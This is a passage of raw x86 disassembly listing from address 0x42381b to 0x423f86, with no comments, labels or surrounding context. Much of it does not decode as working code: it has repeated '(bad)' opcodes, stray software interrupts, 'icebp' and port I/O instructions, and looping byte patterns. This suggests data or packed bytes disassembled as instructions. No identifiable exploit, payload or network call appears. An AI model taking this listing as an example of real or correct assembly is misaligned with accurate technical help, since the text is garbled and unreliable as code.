  42381b:	mov    ds:0xcd8876cd,eax
  423820:	lea    ebp,ds:0xcd2d96cd
  423826:	add    DWORD PTR [ecx],edx
  423828:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423832:	shr    edx,cl
  423834:	sub    BYTE PTR [ebx+0x13],dl
  423837:	jno    0x423806
  423839:	(bad)  
  42383a:	stc    
  42383b:	int    0x96
  42383d:	stc    
  42383e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423841:	cdq    
  423842:	shr    ebx,cl
  423844:	xchg   edx,eax
  423845:	shr    edx,cl
  423847:	sub    BYTE PTR [ebx+0x13],dl
  42384a:	jno    0x42384c
  42384c:	(bad)  
  42384d:	jne    0x42384f
  42384f:	jo     0x42386d
  423851:	int    0x76
  423853:	or     dh,BYTE PTR gs:[esi+0x75]
  423857:	int    0x76
  423859:	xor    eax,0xcdfd760a
  42385e:	jbe    0x42385d
  423860:	cmp    ecx,ebx
  423862:	add    al,0xbd
  423864:	test   ah,dl
  423866:	xor    ecx,ebp
  423868:	jbe    0x4238df
  42386a:	int    0x14
  42386c:	mov    ch,cl
  42386e:	jbe    0x4238e5
  423870:	int    0x84
  423872:	mov    BYTE PTR [ebx],bh
  423874:	jns    0x4238b1
  423876:	aad    0xd3
  423878:	lods   eax,DWORD PTR ds:[esi]
  423879:	sub    bl,dl
  42387b:	repz xchg edx,eax
  42387d:	push   ebx
  42387e:	ror    ch,cl
  423880:	xchg   esi,eax
  423881:	jne    0x42388d
  423883:	test   BYTE PTR [edx-0x33],cl
  423886:	jbe    0x423885
  423888:	add    al,0xd3
  42388a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423891:	xlat   BYTE PTR ds:[ebx]
  423892:	int    0x76
  423894:	std    
  423895:	cmp    ecx,ebx
  423897:	add    al,0xbd
  423899:	test   ah,dl
  42389b:	xor    ecx,ebp
  42389d:	jbe    0x423914
  42389f:	int    0x14
  4238a1:	mov    ch,cl
  4238a3:	jbe    0x42391a
  4238a5:	int    0x84
  4238a7:	mov    BYTE PTR [ebx],bh
  4238a9:	jns    0x4238e6
  4238ab:	aad    0xd3
  4238ad:	lods   eax,DWORD PTR ds:[esi]
  4238ae:	sub    bl,dl
  4238b0:	repz xchg edx,eax
  4238b2:	push   ebx
  4238b3:	ror    ch,cl
  4238b5:	xchg   esi,eax
  4238b6:	jne    0x4238c2
  4238b8:	test   BYTE PTR [edx-0x33],cl
  4238bb:	jbe    0x4238ba
  4238bd:	add    al,0xd3
  4238bf:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  4238c6:	xlat   BYTE PTR ds:[ebx]
  4238c7:	int    0x76
  4238c9:	jne    0x4238d5
  4238cb:	jbe    0x4238da
  4238cd:	int    0x76
  4238cf:	mov    ch,0xcd
  4238d1:	lea    esi,[ebp+0xf3bc53b]
  4238d7:	shl    edx,cl
  4238d9:	sub    bl,dl
  4238db:	mov    ebp,0xcdd35392
  4238e0:	(bad)  
  4238e1:	stc    
  4238e2:	or     dh,BYTE PTR [esi+0x25]
  4238e5:	leave  
  4238e6:	jbe    0x4238b4
  4238e8:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  4238ef:	imul   edx,ebp,0x8d0a0c69
  4238f5:	gs adc bh,dl
  4238f8:	into   
  4238f9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238ff:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423906:	sar    DWORD PTR [ebx],cl
  423908:	lds    ecx,FWORD PTR [edx]
  42390a:	jbe    0x4238b9
  42390c:	rol    esi,cl
  42390e:	lods   eax,DWORD PTR ds:[esi]
  42390f:	xchg   edx,eax
  423910:	or     dh,BYTE PTR [esi-0x30]
  423913:	int    0xd3
  423915:	cmp    edi,DWORD PTR [ecx-0x2d]
  423918:	lods   eax,DWORD PTR ds:[esi]
  423919:	sub    BYTE PTR [ebx+0x76],dl
  42391c:	lods   eax,DWORD PTR ds:[esi]
  42391d:	retf   0x858c
  423920:	int3   
  423921:	das    
  423922:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42392d:	retf   
  42392e:	inc    ebx
  42392f:	rcl    esi,cl
  423931:	jle    0x423900
  423933:	jbe    0x4238ea
  423935:	int    0x8d
  423937:	mov    ch,0xcd
  423939:	jbe    0x4238f0
  42393b:	int    0x96
  42393d:	mov    ch,0x3b
  42393f:	jns    0x42397c
  423941:	or     al,0xd3
  423943:	lods   eax,DWORD PTR ds:[esi]
  423944:	sub    bl,dl
  423946:	jmp    0x4238da
  423948:	push   ebx
  423949:	jge    0x423918
  42394b:	jbe    0x4239b2
  42394d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423950:	lods   eax,DWORD PTR ds:[esi]
  423951:	sub    BYTE PTR [ebx+0x76],dl
  423954:	lods   eax,DWORD PTR ds:[esi]
  423955:	cmp    edx,ebp
  423957:	xchg   DWORD PTR [ebp-0x33],edi
  42395a:	jbe    0x42392c
  42395c:	add    al,0xea
  42395e:	std    
  42395f:	add    al,0xad
  423961:	std    
  423962:	shr    ebx,cl
  423964:	sub    BYTE PTR [edi+0x3b1353f1],al
  42396a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423971:	and    DWORD PTR [esi-0x323329cb],eax
  423977:	jbe    0x42399e
  423979:	in     al,dx
  42397a:	and    cl,ch
  42397c:	jbe    0x423977
  42397e:	int    0x8d
  423980:	stc    
  423981:	cmp    eax,ebp
  423983:	cmp    ecx,DWORD PTR [edi]
  423985:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42398b:	push   ebx
  42398c:	ror    ebp,cl
  42398e:	(bad)  
  42398f:	stc    
  423990:	int    0x96
  423992:	stc    
  423993:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423996:	cdq    
  423997:	shr    ebx,cl
  423999:	xchg   edx,eax
  42399a:	shr    edx,cl
  42399c:	sub    BYTE PTR [ebx+0x13],dl
  42399f:	inc    ebx
  4239a0:	jge    0x4239d1
  4239a2:	add    eax,0x80809223
  4239a7:	int    0x76
  4239a9:	or     eax,0xa886ccd
  4239ae:	out    0xb5,al
  4239b0:	leave  
  4239b1:	jbe    0x4239d8
  4239b3:	mov    dl,0x21
  4239b5:	xchg   BYTE PTR ds:0x393576c9,dh
  4239bb:	and    DWORD PTR [esi-0x6a8936cb],eax
  4239c1:	dec    ecx
  4239c2:	mov    al,ds:0x76c93586
  4239c7:	lods   eax,DWORD PTR ds:[esi]
  4239c8:	imul   esp,DWORD PTR [ecx],0x76c93586
  4239ce:	and    ch,BYTE PTR gs:[ebx-0x7a]
  4239d2:	xor    eax,0xcd3d760a
  4239d7:	jbe    0x423961
  4239d9:	int    0x8d
  4239db:	lods   eax,DWORD PTR ds:[esi]
  4239dc:	int    0x96
  4239de:	lods   eax,DWORD PTR ds:[esi]
  4239df:	cmp    ecx,DWORD PTR [ebx+edx*8]
  4239e2:	jmp    0x423976
  4239e4:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4239ea:	adc    esi,DWORD PTR [ecx-0x33]
  4239ed:	lea    edx,[ebp+0x3b9596cd]
  4239f3:	or     al,0xd3
  4239f5:	jmp    0x423989
  4239f7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239fd:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a04:	jno    0x4239d3
  423a06:	lea    esp,[ebp-0x33]
  423a09:	xchg   esi,eax
  423a0a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423a0e:	cdq    
  423a0f:	shr    ebx,cl
  423a11:	xchg   edx,eax
  423a12:	shr    edx,cl
  423a14:	sub    BYTE PTR [ebx+0x13],dl
  423a17:	jno    0x4239e6
  423a19:	lea    esi,[ebp+0x3bb596cd]
  423a1f:	or     al,0x3b
  423a21:	cdq    
  423a22:	shr    ebx,cl
  423a24:	xchg   edx,eax
  423a25:	shr    edx,cl
  423a27:	sub    BYTE PTR [ebx+0x13],dl
  423a2a:	jno    0x423a2c
  423a2c:	jo     0x423a42
  423a2e:	or     dh,BYTE PTR [esi+0x65]
  423a31:	int    0x76
  423a33:	mov    ch,cl
  423a35:	lea    ebp,[ebp+0x3bad96cd]
  423a3b:	or     al,0xd3
  423a3d:	jmp    0x4239d1
  423a3f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a45:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a4c:	jno    0x423a1b
  423a4e:	lea    edx,[ebp+0x3b9596cd]
  423a54:	or     al,0x3b
  423a56:	cdq    
  423a57:	shr    ebx,cl
  423a59:	xchg   edx,eax
  423a5a:	shr    edx,cl
  423a5c:	sub    BYTE PTR [ebx+0x13],dl
  423a5f:	jno    0x423a2e
  423a61:	lea    esi,[ebp+0xb596cd]
  423a67:	(bad)  
  423a68:	cmp    eax,0x993b0c3b
  423a6d:	shr    ebx,cl
  423a6f:	xchg   edx,eax
  423a70:	shr    edx,cl
  423a72:	sub    BYTE PTR [ebx+0x13],dl
  423a75:	jno    0x423a77
  423a77:	jo     0x423a8d
  423a79:	int    0x8d
  423a7b:	mov    ch,0xa
  423a7d:	jbe    0x423a2c
  423a7f:	int    0x76
  423a81:	mov    ch,0x3b
  423a83:	or     al,0x3b
  423a85:	jns    0x423a5a
  423a87:	jmp    0x423a1b
  423a89:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a8f:	jbe    0x423af6
  423a91:	inc    ebx
  423a92:	jge    0x423ac3
  423a94:	add    eax,0x8080853c
  423a99:	int    0x8d
  423a9b:	mov    ch,0xcd
  423a9d:	xchg   esi,eax
  423a9e:	mov    ch,0x3b
  423aa0:	or     al,0x3b
  423aa2:	cdq    
  423aa3:	shr    ebx,cl
  423aa5:	xchg   edx,eax
  423aa6:	shr    edx,cl
  423aa8:	sub    BYTE PTR [ebx+0x13],dl
  423aab:	inc    ebx
  423aac:	lea    ebp,[ebp-0x7ab2fad1]
  423ab2:	add    BYTE PTR [eax-0x32da7233],0x8d
  423ab9:	and    eax,0x192ebd3
  423abe:	add    ch,BYTE PTR [edi-0x723277f7]
  423ac4:	mov    ch,0xcd
  423ac6:	lea    esi,[ebp+0x192ebd3]
  423acc:	add    ch,BYTE PTR [edi-0x327e83f7]
  423ad2:	lea    esi,ds:0xd3358dcd
  423ad8:	jmp    0x423a6c
  423ada:	add    DWORD PTR [edx],eax
  423adc:	scas   eax,DWORD PTR es:[edi]
  423add:	or     DWORD PTR [edx+edx*4+0x4],edi
  423ae1:	aaa    
  423ae2:	sbb    al,0x0
  423ae4:	add    BYTE PTR [eax],al
  423ae6:	add    BYTE PTR [edi+esi*1],0x24
  423aea:	add    BYTE PTR [eax],al
  423aec:	add    BYTE PTR [eax+0x24cfcf],al
  423af2:	add    BYTE PTR [eax],al
  423af4:	jno    0x423af6
  423af6:	(bad)  
  423af7:	cmp    eax,0x1ccfcf
  423afc:	add    BYTE PTR [eax],al
  423afe:	add    dh,dl
  423b00:	lods   eax,DWORD PTR ds:[esi]
  423b01:	jno    0x423ad0
  423b03:	lea    ecx,ds:0xcd4c9100
  423b09:	lea    esi,[ebp+0x4]
  423b0c:	shl    DWORD PTR [eax],cl
  423b0e:	jno    0x423b80
  423b10:	mov    ebp,0xefef
  423b15:	or     dh,BYTE PTR [esi-0x30]
  423b18:	int    0x76
  423b1a:	mov    ch,cl
  423b1c:	lea    ebp,ds:0xcd2d96cd
  423b22:	add    DWORD PTR [ecx],edx
  423b24:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423b2e:	shr    edx,cl
  423b30:	sub    BYTE PTR [ebx+0x13],dl
  423b33:	jno    0x423b02
  423b35:	lea    esi,[ebp+0x3bb596cd]
  423b3b:	or     al,0x3b
  423b3d:	cdq    
  423b3e:	shr    ebx,cl
  423b40:	xchg   edx,eax
  423b41:	shr    edx,cl
  423b43:	sub    BYTE PTR [ebx+0x13],dl
  423b46:	jno    0x423b48
  423b48:	(bad)  
  423b49:	add    BYTE PTR gs:[eax+0x1c],dh
  423b4d:	int    0x76
  423b4f:	rcl    bl,1
  423b51:	ins    DWORD PTR es:[edi],dx
  423b52:	xchg   edx,eax
  423b53:	cmp    ecx,ecx
  423b55:	inc    ebx
  423b56:	leave  
  423b57:	int    0x76
  423b59:	mov    ch,cl
  423b5b:	lea    ebp,ds:0x811101cd
  423b61:	add    BYTE PTR [eax-0x29d26933],0x54
  423b68:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b6b:	cdq    
  423b6c:	shr    ebx,cl
  423b6e:	xchg   edx,eax
  423b6f:	shr    edx,cl
  423b71:	sub    BYTE PTR [ebx+0x13],dl
  423b74:	jno    0x423b43
  423b76:	lea    esi,[ebp+0x3bb596cd]
  423b7c:	or     al,0x3b
  423b7e:	cdq    
  423b7f:	shr    ebx,cl
  423b81:	xchg   edx,eax
  423b82:	shr    edx,cl
  423b84:	sub    BYTE PTR [ebx+0x13],dl
  423b87:	jno    0x423b89
  423b89:	(bad)  
  423b8a:	jne    0x423b8c
  423b8c:	jo     0x423baa
  423b8e:	int    0x76
  423b90:	lods   eax,DWORD PTR ds:[esi]
  423b91:	or     dh,BYTE PTR [esi+0x75]
  423b94:	int    0x76
  423b96:	cmp    eax,0xecfd760a
  423b9b:	cmp    BYTE PTR [ebx],bh
  423b9d:	or     al,0x3b
  423b9f:	cdq    
  423ba0:	shr    ebx,cl
  423ba2:	xchg   edx,eax
  423ba3:	shr    edx,cl
  423ba5:	sub    BYTE PTR [ebx+0x13],dl
  423ba8:	jno    0x423b77
  423baa:	lea    esi,[ebp+0x3bb596cd]
  423bb0:	or     al,0x3b
  423bb2:	cdq    
  423bb3:	shr    ebx,cl
  423bb5:	xchg   edx,eax
  423bb6:	shr    edx,cl
  423bb8:	sub    BYTE PTR [ebx+0x13],dl
  423bbb:	jno    0x423bbd
  423bbd:	(bad)  
  423bbe:	lods   eax,DWORD PTR ds:[esi]
  423bbf:	add    BYTE PTR [eax+0x1c],dh
  423bc2:	int    0x76
  423bc4:	std    
  423bc5:	or     dh,BYTE PTR [esi+0x1d]
  423bc8:	int    0x76
  423bca:	jne    0x423bd6
  423bcc:	out    0x55,al
  423bce:	or     dh,BYTE PTR [esi-0x30]
  423bd1:	leave  
  423bd2:	jbe    0x423b71
  423bd4:	inc    ecx
  423bd5:	and    DWORD PTR [esi+0x5576cd35],eax
  423bdb:	int    0x8d
  423bdd:	push   ebp
  423bde:	cmp    edi,DWORD PTR [ecx+0x3b]
  423be1:	or     al,0xd3
  423be3:	lods   eax,DWORD PTR ds:[esi]
  423be4:	sub    bl,dl
  423be6:	jmp    0x423b7a
  423be8:	push   ebx
  423be9:	ror    DWORD PTR [edx],cl
  423beb:	jbe    0x423c32
  423bed:	int    0x76
  423bef:	push   ebp
  423bf0:	int    0x8d
  423bf2:	push   ebp
  423bf3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bf6:	or     al,0xd3
  423bf8:	lods   eax,DWORD PTR ds:[esi]
  423bf9:	sub    bl,dl
  423bfb:	jmp    0x423b8f
  423bfd:	push   ebx
  423bfe:	ror    DWORD PTR [edx],cl
  423c00:	jbe    0x423c0f
  423c02:	leave  
  423c03:	jbe    0x423b9a
  423c05:	dec    eax
  423c06:	and    DWORD PTR [esi-0x528936cb],eax
  423c0c:	ret    0x8621
  423c0f:	xor    eax,0xcd5576cd
  423c14:	lea    edx,[ebp+0x3b]
  423c17:	jns    0x423c54
  423c19:	or     al,0xd3
  423c1b:	jmp    0x423baf
  423c1d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c23:	lea    ebx,ds:0x52f7d43
  423c29:	push   ss
  423c2a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423c30:	add    BYTE PTR [eax-0x326a7233],0x76
  423c37:	xchg   ebp,eax
  423c38:	int    0x96
  423c3a:	inc    ebp
  423c3b:	cmp    eax,ebp
  423c3d:	cmp    ecx,DWORD PTR [edi]
  423c3f:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423c45:	push   ebx
  423c46:	jge    0x423c15
  423c48:	jbe    0x423c67
  423c4a:	xor    edx,edx
  423c4c:	cmp    ebx,edx
  423c4e:	clc    
  423c4f:	add    cl,BYTE PTR [edx]
  423c51:	jbe    0x423c60
  423c53:	int    0x76
  423c55:	lods   eax,DWORD PTR ds:[esi]
  423c56:	int    0x8d
  423c58:	lods   eax,DWORD PTR ds:[esi]
  423c59:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c5c:	or     al,0xd3
  423c5e:	jmp    0x423bf2
  423c60:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c66:	lea    ecx,ds:0x16d87d43
  423c6c:	int    0x76
  423c6e:	lods   eax,DWORD PTR ds:[esi]
  423c6f:	int    0x8d
  423c71:	lods   eax,DWORD PTR ds:[esi]
  423c72:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c75:	or     al,0xd3
  423c77:	lods   eax,DWORD PTR ds:[esi]
  423c78:	sub    bl,dl
  423c7a:	jmp    0x423c0e
  423c7c:	push   ebx
  423c7d:	ror    DWORD PTR [edx],cl
  423c7f:	jbe    0x423c8e
  423c81:	int    0x76
  423c83:	xchg   ebp,eax
  423c84:	int    0x8d
  423c86:	xchg   ebp,eax
  423c87:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c8a:	or     al,0xd3
  423c8c:	lods   eax,DWORD PTR ds:[esi]
  423c8d:	sub    bl,dl
  423c8f:	jmp    0x423c23
  423c91:	push   ebx
  423c92:	ror    ebp,cl
  423c94:	lea    ecx,ds:0xad3d12f
  423c9a:	jbe    0x423ca9
  423c9c:	int    0x76
  423c9e:	push   ebp
  423c9f:	int    0x8d
  423ca1:	push   ebp
  423ca2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ca5:	or     al,0xd3
  423ca7:	jmp    0x423c3b
  423ca9:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423caf:	lea    ecx,ds:0x52f7d43
  423cb5:	pusha  
  423cb6:	xchg   edx,eax
  423cb7:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423cbe:	or     eax,0x874576cd
  423cc3:	jbe    0x423c95
  423cc5:	or     ah,dh
  423cc7:	cmp    eax,0x5d5d760a
  423ccc:	inc    ecx
  423ccd:	and    DWORD PTR [esi+0x6d760a35],eax
  423cd3:	leave  
  423cd4:	jbe    0x423d3b
  423cd6:	cmp    DWORD PTR [ecx],esp
  423cd8:	xchg   BYTE PTR ds:0xb22576c9,dh
  423cde:	and    DWORD PTR [esi-0xe89f5cb],eax
  423ce4:	int    0x76
  423ce6:	cmp    eax,0x3b3d8dcd
  423ceb:	jns    0x423d28
  423ced:	or     al,0xd3
  423cef:	lods   eax,DWORD PTR ds:[esi]
  423cf0:	sub    bl,dl
  423cf2:	jmp    0x423c86
  423cf4:	push   ebx
  423cf5:	ror    DWORD PTR [edx],cl
  423cf7:	jbe    0x423d76
  423cf9:	int    0x6d
  423cfb:	jmp    0x423d03
  423cfd:	add    DWORD PTR [eax-0x36923280],0x8c06
  423d07:	add    BYTE PTR [ebx],cl
  423d09:	and    DWORD PTR [esi-0x369232cb],eax
  423d0f:	push   es
  423d10:	jl     0x423d12
  423d12:	add    BYTE PTR [eax],al
  423d14:	mul    DWORD PTR [ecx]
  423d16:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423d1c:	int    0x76
  423d1e:	icebp  
  423d1f:	int    0x8d
  423d21:	icebp  
  423d22:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d25:	or     al,0xd3
  423d27:	lods   eax,DWORD PTR ds:[esi]
  423d28:	sub    bl,dl
  423d2a:	jmp    0x423cbe
  423d2c:	push   ebx
  423d2d:	ror    ebp,cl
  423d2f:	lea    edi,[ebp+0x2f]
  423d32:	rcl    ebx,1
  423d34:	int    0x8d
  423d36:	pop    ebp
  423d37:	retf   0x8884
  423d3a:	or     DWORD PTR [esi-0x1f],esi
  423d3d:	int    0x6d
  423d3f:	int    0x76
  423d41:	icebp  
  423d42:	int    0x8d
  423d44:	icebp  
  423d45:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423d48:	jns    0x423d1d
  423d4a:	jmp    0x423cde
  423d4c:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d52:	lea    edi,[ebp+0x2f]
  423d55:	rcl    ebx,1
  423d57:	int    0x8d
  423d59:	gs int 0x96
  423d5c:	cmp    ecx,DWORD PTR gs:[edi]
  423d5f:	cmp    edx,ebp
  423d61:	shl    edx,cl
  423d63:	sub    bl,dl
  423d65:	repz xchg edx,eax
  423d67:	push   ebx
  423d68:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d6e:	das    
  423d6f:	pop    ecx
  423d70:	dec    esp
  423d71:	mov    ch,cl
  423d73:	push   es
  423d74:	mov    WORD PTR [eax],es
  423d76:	add    BYTE PTR [eax],al
  423d78:	int    0x17
  423d7a:	mov    WORD PTR [eax],es
  423d7c:	add    BYTE PTR [eax],al
  423d7e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d81:	aad    0xd3
  423d83:	lods   eax,DWORD PTR ds:[esi]
  423d84:	sub    bl,dl
  423d86:	repz xchg edx,eax
  423d88:	push   ebx
  423d89:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d8f:	loope  0x423dcc
  423d91:	jge    0x423d9c
  423d93:	(bad)  
  423d94:	loope  0x423d63
  423d96:	ins    DWORD PTR es:[edi],dx
  423d97:	retf   0xe176
  423d9a:	int    0x8d
  423d9c:	icebp  
  423d9d:	int    0x96
  423d9f:	icebp  
  423da0:	cmp    ecx,DWORD PTR [edi]
  423da2:	cmp    edx,ebp
  423da4:	shl    ebx,cl
  423da6:	xchg   edx,eax
  423da7:	shl    edx,cl
  423da9:	sub    BYTE PTR [ebx+0x13],dl
  423dac:	int    0x96
  423dae:	jge    0x423ddf
  423db0:	rcl    DWORD PTR [ebx],1
  423db2:	int    0x96
  423db4:	pop    ebp
  423db5:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dbc:	icebp  
  423dbd:	int    0x8d
  423dbf:	icebp  
  423dc0:	cmp    edi,DWORD PTR [ecx+0x3b]
  423dc3:	or     al,0xd3
  423dc5:	lods   eax,DWORD PTR ds:[esi]
  423dc6:	sub    bl,dl
  423dc8:	jmp    0x423d5c
  423dca:	push   ebx
  423dcb:	ror    ebp,cl
  423dcd:	lea    edi,[ebp+0x2f]
  423dd0:	rcl    ebx,1
  423dd2:	int    0x8d
  423dd4:	pop    ebp
  423dd5:	retf   0x8884
  423dd8:	or     DWORD PTR [esi-0x1f],esi
  423ddb:	int    0x6d
  423ddd:	int    0x76
  423ddf:	icebp  
  423de0:	int    0x8d
  423de2:	icebp  
  423de3:	cmp    edi,DWORD PTR [ecx-0x2d]
  423de6:	lods   eax,DWORD PTR ds:[esi]
  423de7:	sub    BYTE PTR [ebx],bh
  423de9:	or     al,0xd3
  423deb:	jmp    0x423d7f
  423ded:	push   ebx
  423dee:	ror    ebp,cl
  423df0:	lea    edi,[ebp+0x2f]
  423df3:	rcl    ebx,1
  423df5:	int    0x8d
  423df7:	ins    DWORD PTR es:[edi],dx
  423df8:	int    0x96
  423dfa:	ins    DWORD PTR es:[edi],dx
  423dfb:	cmp    ecx,DWORD PTR [edi]
  423dfd:	cmp    edx,ebp
  423dff:	shl    edx,cl
  423e01:	sub    bl,dl
  423e03:	repz xchg edx,eax
  423e05:	push   ebx
  423e06:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423e0c:	das    
  423e0d:	pop    ecx
  423e0e:	dec    esp
  423e0f:	mov    ch,cl
  423e11:	push   es
  423e12:	jl     0x423e14
  423e14:	add    BYTE PTR [eax],al
  423e16:	int    0x17
  423e18:	jl     0x423e1a
  423e1a:	add    BYTE PTR [eax],al
  423e1c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e1f:	aad    0xd3
  423e21:	lods   eax,DWORD PTR ds:[esi]
  423e22:	sub    bl,dl
  423e24:	repz xchg edx,eax
  423e26:	push   ebx
  423e27:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423e2d:	loope  0x423e6a
  423e2f:	jge    0x423e3a
  423e31:	(bad)  
  423e32:	loope  0x423e01
  423e34:	ins    DWORD PTR es:[edi],dx
  423e35:	retf   0xe176
  423e38:	int    0x8d
  423e3a:	icebp  
  423e3b:	int    0x96
  423e3d:	icebp  
  423e3e:	cmp    ecx,DWORD PTR [edi]
  423e40:	cmp    edx,ebp
  423e42:	shl    ebx,cl
  423e44:	xchg   edx,eax
  423e45:	shl    edx,cl
  423e47:	sub    BYTE PTR [ebx+0x13],dl
  423e4a:	int    0x96
  423e4c:	jge    0x423e7d
  423e4e:	rcl    DWORD PTR [ebx],1
  423e50:	int    0x96
  423e52:	pop    ebp
  423e53:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e5a:	and    eax,0x3b258dcd
  423e5f:	or     al,0x3b
  423e61:	jns    0x423e36
  423e63:	jmp    0x423df7
  423e65:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e6b:	lea    ebp,[ebp-0x33]
  423e6e:	xchg   esi,eax
  423e6f:	ins    DWORD PTR es:[edi],dx
  423e70:	cmp    ecx,DWORD PTR [edi]
  423e72:	cmp    edx,ebp
  423e74:	shl    edx,cl
  423e76:	sub    bl,dl
  423e78:	repz xchg edx,eax
  423e7a:	push   ebx
  423e7b:	adc    ebp,DWORD PTR [edi]
  423e7d:	rcl    ebx,1
  423e7f:	xchg   DWORD PTR [esi+0x7d],esi
  423e82:	or     dh,BYTE PTR [esi+0x7d]
  423e85:	int    0x76
  423e87:	jge    0x423e56
  423e89:	lea    ecx,ds:0xb2f7d43
  423e8f:	(bad)  
  423e90:	inc    DWORD PTR [eax]
  423e92:	add    ch,cl
  423e94:	jbe    0x423f03
  423e96:	int    0x8d
  423e98:	ins    DWORD PTR es:[edi],dx
  423e99:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e9c:	jmp    0x423e30
  423e9e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ea1:	lods   eax,DWORD PTR ds:[esi]
  423ea2:	sub    BYTE PTR [ebx-0x2d],dl
  423ea5:	int    0x8d
  423ea7:	or     eax,0xcdd3d12f
  423eac:	lea    edi,ds:0xf2d30f3b
  423eb2:	sub    BYTE PTR [ebx-0x2d],dl
  423eb5:	int    0x8d
  423eb7:	cmp    eax,0xebd30c3b
  423ebc:	xchg   edx,eax
  423ebd:	push   ebx
  423ebe:	ror    DWORD PTR [edx],cl
  423ec0:	jbe    0x423f27
  423ec2:	int    0x76
  423ec4:	popf   
  423ec5:	int    0x8d
  423ec7:	popf   
  423ec8:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423ecb:	jmp    0x423e5f
  423ecd:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ed0:	lods   eax,DWORD PTR ds:[esi]
  423ed1:	sub    BYTE PTR [ebx-0x2d],dl
  423ed4:	int    0x8d
  423ed6:	popf   
  423ed7:	int    0x96
  423ed9:	popf   
  423eda:	cmp    ecx,DWORD PTR [edi]
  423edc:	shl    edx,cl
  423ede:	sub    BYTE PTR [ebx],bh
  423ee0:	aad    0xd3
  423ee2:	repz xchg edx,eax
  423ee4:	push   ebx
  423ee5:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423eeb:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423ef1:	in     al,dx
  423ef2:	sbb    al,0xcd
  423ef4:	jbe    0x423e93
  423ef6:	int    0x8d
  423ef8:	popf   
  423ef9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423efc:	or     al,0xd3
  423efe:	lods   eax,DWORD PTR ds:[esi]
  423eff:	sub    bl,dl
  423f01:	jmp    0x423e95
  423f03:	push   ebx
  423f04:	rol    DWORD PTR [edi+0x760a4576],cl
  423f0a:	inc    ebp
  423f0b:	int    0x76
  423f0d:	popf   
  423f0e:	int    0x8d
  423f10:	popf   
  423f11:	cmp    edi,DWORD PTR [ecx-0x2d]
  423f14:	lods   eax,DWORD PTR ds:[esi]
  423f15:	sub    BYTE PTR [ebx],bh
  423f17:	or     al,0xd3
  423f19:	jmp    0x423ead
  423f1b:	push   ebx
  423f1c:	ror    ebp,cl
  423f1e:	lea    ebx,ds:0x76cd7d33
  423f24:	popf   
  423f25:	int    0x96
  423f27:	popf   
  423f28:	cmp    edi,DWORD PTR [ecx+0x3b]
  423f2b:	aad    0xd3
  423f2d:	repz xchg edx,eax
  423f2f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423f35:	xchg   esi,eax
  423f36:	inc    ebp
  423f37:	das    
  423f38:	rcl    edx,1
  423f3a:	inc    ebx
  423f3b:	shr    DWORD PTR [edi],cl
  423f3d:	pop    es
  423f3e:	adc    ebp,edi
  423f40:	add    BYTE PTR [eax],al
  423f42:	int    0x76
  423f44:	mov    BYTE PTR [eax],al
  423f46:	(bad)  
  423f47:	dec    esp
  423f48:	iret   
  423f49:	jbe    0x423f08
  423f4b:	add    dh,dl
  423f4d:	mov    BYTE PTR [eax-0x33],dh
  423f50:	jbe    0x423eda
  423f52:	int    0x1
  423f54:	xchg   ebp,eax
  423f55:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f5f:	icebp  
  423f60:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f6a:	jne    0x423f29
  423f6c:	test   al,0x88
  423f6e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f75:	stc    
  423f76:	int    0x8d
  423f78:	stc    
  423f79:	cmp    eax,ebp
  423f7b:	cmp    ecx,DWORD PTR [edi]
  423f7d:	shl    edx,cl
  423f7f:	sub    bl,dl
  423f81:	mov    ebp,0xcdd35392
  423f86:	lea    esi,[ebp+0x43]
